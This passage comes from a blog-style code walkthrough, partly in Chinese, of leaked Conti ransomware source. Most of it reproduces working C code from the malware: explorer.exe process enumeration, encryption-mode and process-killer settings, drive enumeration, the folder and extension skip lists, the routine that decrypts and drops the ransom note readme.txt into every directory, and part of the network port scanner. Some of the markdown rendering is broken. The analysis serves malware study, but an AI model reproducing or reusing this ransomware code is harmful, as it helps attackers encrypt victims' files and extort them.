PidList)</span></span><br><span class="line">&#123;</span><br><span class="line">	HANDLE hSnapShot = pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (hSnapShot == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	PROCESSENTRY32W pe32;</span><br><span class="line">	pe32.dwSize = <span class="keyword">sizeof</span>(PROCESSENTRY32W);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!pProcess32FirstW(hSnapShot, &amp;pe32)) &#123;</span><br><span class="line"></span><br><span class="line">		pCloseHandle(hSnapShot);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">do</span></span><br><span class="line">	&#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!plstrcmpiW(pe32.szExeFile, OBFW(<span class="string">L&quot;explorer.exe&quot;</span>))) &#123;</span><br><span class="line"></span><br><span class="line">			PPID Pid = (PPID)m_malloc(<span class="keyword">sizeof</span>(PID));</span><br><span class="line">			<span class="keyword">if</span> (!Pid) &#123;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			Pid-&gt;dwProcessId = pe32.th32ProcessID;</span><br><span class="line">			TAILQ_INSERT_TAIL(PidList, Pid, Entries);</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125; <span class="keyword">while</span> (pProcess32NextW(hSnapShot, &amp;pe32));</span><br><span class="line"></span><br><span class="line">	pCloseHandle(hSnapShot);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">typedef struct tagPROCESSENTRY32W</span><br><span class="line">&#123;</span><br><span class="line">    DWORD   dwSize;</span><br><span class="line">    DWORD   cntUsage;</span><br><span class="line">    DWORD   th32ProcessID;          // this process</span><br><span class="line">    ULONG_PTR th32DefaultHeapID;</span><br><span class="line">    DWORD   th32ModuleID;           // associated exe</span><br><span class="line">    DWORD   cntThreads;</span><br><span class="line">    DWORD   th32ParentProcessID;    // this process&#x27;s parent process</span><br><span class="line">    LONG    pcPriClassBase;         // Base priority of process&#x27;s threads</span><br><span class="line">    DWORD   dwFlags;</span><br><span class="line">    WCHAR   szExeFile[MAX_PATH];    // Path</span><br><span class="line">&#125; PROCESSENTRY32W;</span><br></pre></td></tr></table></figure>

<p>szExeFile为进程运行文件路径</p>
</blockquote>
<h3 id="Whitelist"><a href="#Whitelist" class="headerlink" title="Whitelist"></a>Whitelist</h3><p>把进程名不为explorer.exe的进程全都插入到白名单进程列表中。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span>	TAILQ_INSERT_TAIL(head, elm, field) do &#123;			\</span></span><br><span class="line"><span class="meta">	TAILQ_NEXT((elm), field) = NULL;				\</span></span><br><span class="line"><span class="meta">	(elm)-&gt;field.tqe_prev = (head)-&gt;tqh_last;			\</span></span><br><span class="line"><span class="meta">	*(head)-&gt;tqh_last = (elm);					\</span></span><br><span class="line"><span class="meta">	(head)-&gt;tqh_last = &amp;TAILQ_NEXT((elm), field);			\</span></span><br><span class="line"><span class="meta">&#125; while (0)</span></span><br></pre></td></tr></table></figure>

<h2 id="global"><a href="#global" class="headerlink" title="global"></a>global</h2><p>set some global parameters,maybe used to build different character sample(extension,mutex…..)</p>
<ul>
<li>Extention</li>
<li>DecryptionNote</li>
<li>EncryptMode<ul>
<li>ALL_ENCRYPT 10</li>
<li>LOCAL_ENCRYPT 11</li>
<li>NETWORK_ENCRYPT 12</li>
<li>BACKUPS_ENCRYPT 13</li>
<li>PATH_ENCRYPT 14</li>
</ul>
</li>
<li>IsProcKillerEnabled</li>
<li>EncryptPath</li>
<li>EncryptSize</li>
<li>MutexName</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">STATIC WCHAR g_Extention[<span class="number">7</span>] = <span class="string">L&quot;.EXTEN&quot;</span>;</span><br><span class="line">STATIC CHAR g_DecryptNote[<span class="number">2048</span>] = <span class="string">&quot;__DECRYPT_NOTE__&quot;</span>;</span><br><span class="line">STATIC INT g_EncryptMode = ALL_ENCRYPT;</span><br><span class="line">STATIC BOOL g_IsProcKillerEnabled = FALSE;</span><br><span class="line">STATIC LPCWSTR g_EncryptPath = <span class="literal">NULL</span>;</span><br><span class="line">STATIC BYTE g_EncryptSize = <span class="number">50</span>;</span><br><span class="line"><span class="comment">//STATIC CHAR g_MutexName[65] = &quot;__MUTEX_NAME__&quot;;</span></span><br><span class="line"></span><br><span class="line">PWCHAR </span><br><span class="line"><span class="title function_">global::GetExtention</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> g_Extention;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PCHAR </span><br><span class="line"><span class="title function_">global::GetDecryptNote</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> g_DecryptNote;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PCHAR</span><br><span class="line"><span class="title function_">global::GetMutexName</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//return g_MutexName;</span></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">VOID</span><br><span class="line"><span class="title function_">global::SetEncryptMode</span><span class="params">(INT EncryptMode)</span></span><br><span class="line">&#123;</span><br><span class="line">	g_EncryptMode = EncryptMode;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">INT</span><br><span class="line"><span class="title function_">global::GetEncryptMode</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> g_EncryptMode;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">VOID</span><br><span class="line"><span class="title function_">global::SetProcKiller</span><span class="params">(BOOL IsEnabled)</span></span><br><span class="line">&#123;</span><br><span class="line">	g_IsProcKillerEnabled = IsEnabled;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL </span><br><span class="line"><span class="title function_">global::GetProcKiller</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> g_IsProcKillerEnabled;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">VOID </span><br><span class="line"><span class="title function_">global::SetEncryptPath</span><span class="params">(__in LPCWSTR Path)</span></span><br><span class="line">&#123;</span><br><span class="line">	g_EncryptPath = Path;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">LPCWSTR</span><br><span class="line"><span class="title function_">global::GetEncryptPath</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> g_EncryptPath;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL </span><br><span class="line"><span class="title function_">global::SetEncryptSize</span><span class="params">(__in INT Size)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (Size != <span class="number">10</span> ||</span><br><span class="line">		Size != <span class="number">15</span> ||</span><br><span class="line">		Size != <span class="number">20</span> ||</span><br><span class="line">		Size != <span class="number">25</span> ||</span><br><span class="line">		Size != <span class="number">30</span> ||</span><br><span class="line">		Size != <span class="number">35</span> ||</span><br><span class="line">		Size != <span class="number">40</span> ||</span><br><span class="line">		Size != <span class="number">45</span> ||</span><br><span class="line">		Size != <span class="number">50</span> ||</span><br><span class="line">		Size != <span class="number">60</span> ||</span><br><span class="line">		Size != <span class="number">70</span> ||</span><br><span class="line">		Size != <span class="number">80</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		g_EncryptSize = <span class="number">50</span>;</span><br></pre></td></tr></table></figure>

<h2 id="logs"><a href="#logs" class="headerlink" title="logs"></a>logs</h2><ul>
<li>va_start</li>
<li>va_arg</li>
<li>va_end</li>
</ul>
<p>The <strong>RtlSecureZeroMemory</strong> routine fills a block of memory with zeros in a way that is guaranteed to be secure.</p>
<h3 id="init"><a href="#init" class="headerlink" title="init"></a>init</h3><blockquote>
<p>init in function main:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">LPWSTR LogFile = GetCommandLineArg(Argv, Argc, OBFW(<span class="string">L&quot;-log&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (LogFile) &#123;</span><br><span class="line"></span><br><span class="line">		logs::Init(LogFile);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">logs::Init(LPCWSTR LogFile)</span><br><span class="line">&#123;</span><br><span class="line">	pInitializeCriticalSection(&amp;g_CritSec);</span><br><span class="line">	g_LogHandle = pCreateFileW(</span><br><span class="line">		LogFile,</span><br><span class="line">		GENERIC_WRITE,</span><br><span class="line">		FILE_SHARE_READ,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		OPEN_ALWAYS,</span><br><span class="line">		FILE_FLAG_WRITE_THROUGH,</span><br><span class="line">		<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	pSetFilePointer(g_LogHandle, <span class="number">0</span>, <span class="literal">NULL</span>, FILE_END);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="write"><a href="#write" class="headerlink" title="write"></a>write</h3><p>write some errors.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logs::Write(OBFW(L&quot;FindFirstFile fails in directory %s. GetLastError = %lu.&quot;), CurrentDirectory.c_str(), pGetLastError());</span><br></pre></td></tr></table></figure>

<h2 id="filesystem"><a href="#filesystem" class="headerlink" title="filesystem"></a>filesystem</h2><h3 id="disks"><a href="#disks" class="headerlink" title="disks"></a>disks</h3><ul>
<li>SIZE_T BufferLength &#x3D; (SIZE_T)pGetLogicalDriveStringsW(0, NULL); </li>
<li>pGetLogicalDriveStringsW(BufferLength, Buffer);</li>
</ul>
<blockquote>
<p>GetLogicalDriveStringsW</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DWORD GetLogicalDriveStringsW(</span><br><span class="line">[in]  DWORD  nBufferLength,</span><br><span class="line">[out] LPWSTR lpBuffer</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>If the function succeeds, the return value is the length, in characters, of the strings copied to the buffer, not including the terminating null character. Note that an ANSI-ASCII null character uses one byte, but a Unicode (UTF-16) null character uses two bytes.</p>
<p>If the buffer is not large enough, the return value is greater than <em>nBufferLength</em>. It is the size of the buffer required to hold the drive strings.</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;filesystem.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;../api/getapi.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;../memory.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;../logs/logs.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">INT </span><br><span class="line"><span class="title function_">filesystem::EnumirateDrives</span><span class="params">(__in PDRIVE_LIST DriveList)</span></span><br><span class="line">&#123;</span><br><span class="line">	INT Length = <span class="number">0</span>;</span><br><span class="line">	INT DrivesCount = <span class="number">0</span>;</span><br><span class="line">	DWORD DriveType = <span class="number">0</span>;</span><br><span class="line">	TAILQ_INIT(DriveList);</span><br><span class="line"></span><br><span class="line">	SIZE_T BufferLength = (SIZE_T)pGetLogicalDriveStringsW(<span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (!BufferLength) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	LPWSTR Buffer = (LPWSTR)m_malloc((BufferLength + <span class="number">1</span>) * <span class="keyword">sizeof</span>(WCHAR));</span><br><span class="line">	<span class="keyword">if</span> (!Buffer) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	pGetLogicalDriveStringsW(BufferLength, Buffer);</span><br><span class="line">	</span><br><span class="line">	LPWSTR tempBuffer = Buffer;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (Length = (INT)plstrlenW(tempBuffer)) &#123;</span><br><span class="line"></span><br><span class="line">		PDRIVE_INFO DriveInfo = new DRIVE_INFO;</span><br><span class="line">		<span class="keyword">if</span> (!DriveInfo) &#123;</span><br><span class="line"></span><br><span class="line">			<span class="built_in">free</span>(Buffer);</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">		DriveInfo-&gt;RootPath = tempBuffer;</span><br><span class="line">		TAILQ_INSERT_TAIL(DriveList, DriveInfo, Entries);</span><br><span class="line"></span><br><span class="line">		DrivesCount++;</span><br><span class="line">		tempBuffer += Length + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	logs::Write(OBFW(<span class="string">L&quot;Found %d drives: &quot;</span>), DrivesCount);</span><br><span class="line"></span><br><span class="line">	PDRIVE_INFO DriveInfo = <span class="literal">NULL</span>;</span><br><span class="line">	TAILQ_FOREACH(DriveInfo, DriveList, Entries) &#123;</span><br><span class="line">		logs::Write(OBFW(<span class="string">L&quot;%s&quot;</span>), DriveInfo-&gt;RootPath.c_str());</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">free</span>(Buffer);</span><br><span class="line">	<span class="keyword">return</span> DrivesCount;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="search"><a href="#search" class="headerlink" title="search"></a>search</h3><ul>
<li><p>MakeSearchMask</p>
<ul>
<li>used to generate a search mask path</li>
</ul>
</li>
<li><p>MakePath</p>
<ul>
<li>used to generate the file path</li>
</ul>
</li>
<li><p>CheckDirectory</p>
<ul>
<li><p>check if the <code>directory</code> is in the Blacklist, if yes then pass this directory. This is to make sure the system running without breaking.</p>
<ul>
<li>&#96;&#96;&#96;<br>      OBFW(L”tmp”),<br>          OBFW(L”winnt”),<br>          OBFW(L”temp”),<br>          OBFW(L”thumb”),<br>          OBFW(L”$Recycle.Bin”),<br>          OBFW(L”$RECYCLE.BIN”),<br>          OBFW(L”System Volume Information”),<br>          OBFW(L”Boot”),<br>          OBFW(L”Windows”),<br>          OBFW(L”Trend Micro”),<br>          OBFW(L”perflogs”)  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- CheckFilename</span><br><span class="line"></span><br><span class="line">    - check if the `file` is in the Blacklist, if yes then pass this file. This is to make sure the system running without breaking.</span><br><span class="line"></span><br><span class="line">        - ```</span><br><span class="line">            		OBFW(L&quot;.exe&quot;),</span><br><span class="line">                		OBFW(L&quot;.dll&quot;),</span><br><span class="line">                		OBFW(L&quot;.lnk&quot;),</span><br><span class="line">                		OBFW(L&quot;.sys&quot;),</span><br><span class="line">                		OBFW(L&quot;.msi&quot;),</span><br><span class="line">                		OBFW(L&quot;readme.txt&quot;),</span><br><span class="line">                		OBFW(L&quot;CONTI_LOG.txt&quot;),</span><br><span class="line">                		OBFW(L&quot;.bat&quot;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
</li>
<li><p>DropInstruction</p>
<ul>
<li>release the reame.txt to every directory that is encrypted by Ransomeware.</li>
<li>the DecryptionNotes is encrypted with chacha<ul>
<li>the first 16 bytes is the key</li>
<li>the 16-20 bytes is the iv</li>
<li>the follow is the encrypted data</li>
</ul>
</li>
</ul>
</li>
<li><p>SearchFiles</p>
</li>
</ul>
<h4 id="DropInstruction"><a href="#DropInstruction" class="headerlink" title="DropInstruction"></a>DropInstruction</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">DropInstruction(__in <span class="built_in">std</span>::<span class="built_in">wstring</span> Directory)</span><br><span class="line">&#123;</span><br><span class="line">	LPCWSTR str = OBFW(<span class="string">L&quot;readme.txt&quot;</span>);</span><br><span class="line">	<span class="built_in">std</span>::<span class="built_in">wstring</span> Filename = MakePath(Directory, str);</span><br><span class="line"></span><br><span class="line">	HANDLE hFile = pCreateFileW(</span><br><span class="line">		Filename.c_str(),</span><br><span class="line">		GENERIC_WRITE,</span><br><span class="line">		<span class="number">0</span>,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		CREATE_ALWAYS,</span><br><span class="line">		<span class="number">0</span>,</span><br><span class="line">		<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (hFile == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	DWORD dwDecryptNote = <span class="number">0</span>;</span><br><span class="line">	LPSTR DecryptNote = global::GetDecryptNote();</span><br><span class="line"></span><br><span class="line">	ECRYPT_ctx CryptCtx;</span><br><span class="line">	BYTE ChaChaKey[<span class="number">32</span>];</span><br><span class="line">	BYTE ChaChaIV[<span class="number">8</span>];</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memcpy</span>(ChaChaKey, DecryptNote, <span class="number">32</span>);</span><br><span class="line">	<span class="built_in">memcpy</span>(ChaChaIV, DecryptNote + <span class="number">32</span>, <span class="number">8</span>);</span><br><span class="line">	<span class="built_in">memcpy</span>(&amp;dwDecryptNote, DecryptNote + <span class="number">40</span>, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">	LPSTR DecryptNotePlainText = (LPSTR)m_malloc(dwDecryptNote);</span><br><span class="line">	<span class="keyword">if</span> (!DecryptNotePlainText) &#123;</span><br><span class="line"></span><br><span class="line">		pCloseHandle(hFile);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	RtlSecureZeroMemory(&amp;CryptCtx, <span class="keyword">sizeof</span>(CryptCtx));</span><br><span class="line">  ECRYPT_keysetup(&amp;CryptCtx, ChaChaKey, <span class="number">256</span>, <span class="number">64</span>);</span><br><span class="line">	ECRYPT_ivsetup(&amp;CryptCtx, ChaChaIV);</span><br><span class="line"></span><br><span class="line">	ECRYPT_decrypt_bytes(&amp;CryptCtx, (PBYTE)DecryptNote + <span class="number">44</span>, (PBYTE)DecryptNotePlainText, dwDecryptNote);</span><br><span class="line"></span><br><span class="line">	DWORD BytesWritten;</span><br><span class="line">	pWriteFile(hFile, DecryptNotePlainText, dwDecryptNote, &amp;BytesWritten, <span class="literal">NULL</span>);</span><br><span class="line">	pCloseHandle(hFile);</span><br><span class="line">	RtlSecureZeroMemory(DecryptNotePlainText, dwDecryptNote);</span><br><span class="line">	<span class="built_in">free</span>(DecryptNotePlainText);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="networkscanner"><a href="#networkscanner" class="headerlink" title="networkscanner"></a>networkscanner</h2><p>complex network scanner code.</p>
<ul>
<li><p>PortScanHandler</p>
<ul>
<li>pGetQueuedCompletionStatus</li>
<li>pPostQueuedCompletionStatus<ul>
<li>START_COMPLETION_KEY</li>
<li>CONNECT_COMPLETION_KEY</li>
<li>TIMER_COMPLETION_KEY</li>
</ul>
</li>
<li>CancelIo<ul>
<li>Cancels all pending input and output (I&#x2F;O) operations that are issued by the calling thread for the specified file. The function does not cancel I&#x2F;O operations that other threads issue for a file handle.</li>
</ul>
</li>
<li>shutdown<ul>
<li>The <strong>shutdown</strong> function disables sends or receives on a socket.</li>
</ul>
</li>
</ul>
</li>
<li><p>TimerCallback</p>
<ul>
<li><pre><code class="c">  if (!pCreateTimerQueueTimer(&amp;hTimer, hTimerQueue, &amp;TimerCallback, NULL, 30000, 0, 0)) &#123;
                  pExitThread(EXIT_FAILURE);
  &#125;
  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- a callback function that used with PostQueuedCompletionStatus. </span><br><span class="line"></span><br><span class="line">- ```c</span><br><span class="line">    BOOL CreateTimerQueueTimer(</span><br><span class="line">      [out]          PHANDLE             phNewTimer,</span><br><span class="line">      [in, optional] HANDLE              TimerQueue,</span><br><span class="line">      [in]           WAITORTIMERCALLBACK Callback,</span><br><span class="line">      [in, optional] PVOID               Parameter,</span><br><span class="line">      [in]           DWORD               DueTime,</span><br><span class="line">      [in]           DWORD               Period,</span><br><span class="line">      [in]           ULONG               Flags</span><br><span class="line">    );</span><br></pre></td></tr></table></figure>
</code></pre>
</li>
<li><p>The amount of time in milliseconds relative to the current time that must elapse before the timer is signaled for the first time.</p>
</li>
<li><p>so 30000 &#x2F; 1000 &#x3D; 30s, one call to the Callback function(TimerCallback),if connection is set then CancelIo it .if not ,then shutdown and close the socket</p>
</li>
</ul>
</li>
</ul>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (CompletionStatus == TIMER_COMPLETION_KEY) &#123;</span><br><span class="line"></span><br><span class="line">			IsTimerActivated = TRUE;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (g_ActiveOperations) &#123;</span><br><span class="line"></span><br><span class="line">				PCONNECT_CONTEXT ConnectCtx = <span class="literal">NULL</span>;</span><br><span class="line">				TAILQ_FOREACH(ConnectCtx, &amp;g_ConnectionList, Entries) &#123;</span><br><span class="line"></span><br><span class="line">					<span class="keyword">if</span> (ConnectCtx-&gt;State == CONNECTING) &#123;</span><br><span class="line">						pCancelIo((HANDLE)ConnectCtx-&gt;s);</span><br><span class="line">					&#125;</span><br><span class="line"></span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">while</span> (!TAILQ_EMPTY(&amp;g_ConnectionList)) &#123;</span><br><span class="line"></span><br><span class="line">					PCONNECT_CONTEXT ConnectCtx = TAILQ_FIRST(&amp;g_ConnectionList);</span><br><span class="line">					pshutdown(ConnectCtx-&gt;s, SD_SEND);</span><br><span class="line">					pclosesocket(ConnectCtx-&gt;s);</span><br><span class="line">					TAILQ_REMOVE(&amp;g_ConnectionList, ConnectCtx, Entries);</span><br><span class="line">					pGlobalFree(ConnectCtx);</span><br><span class="line"></span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (!CreateHostTable()) &#123;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				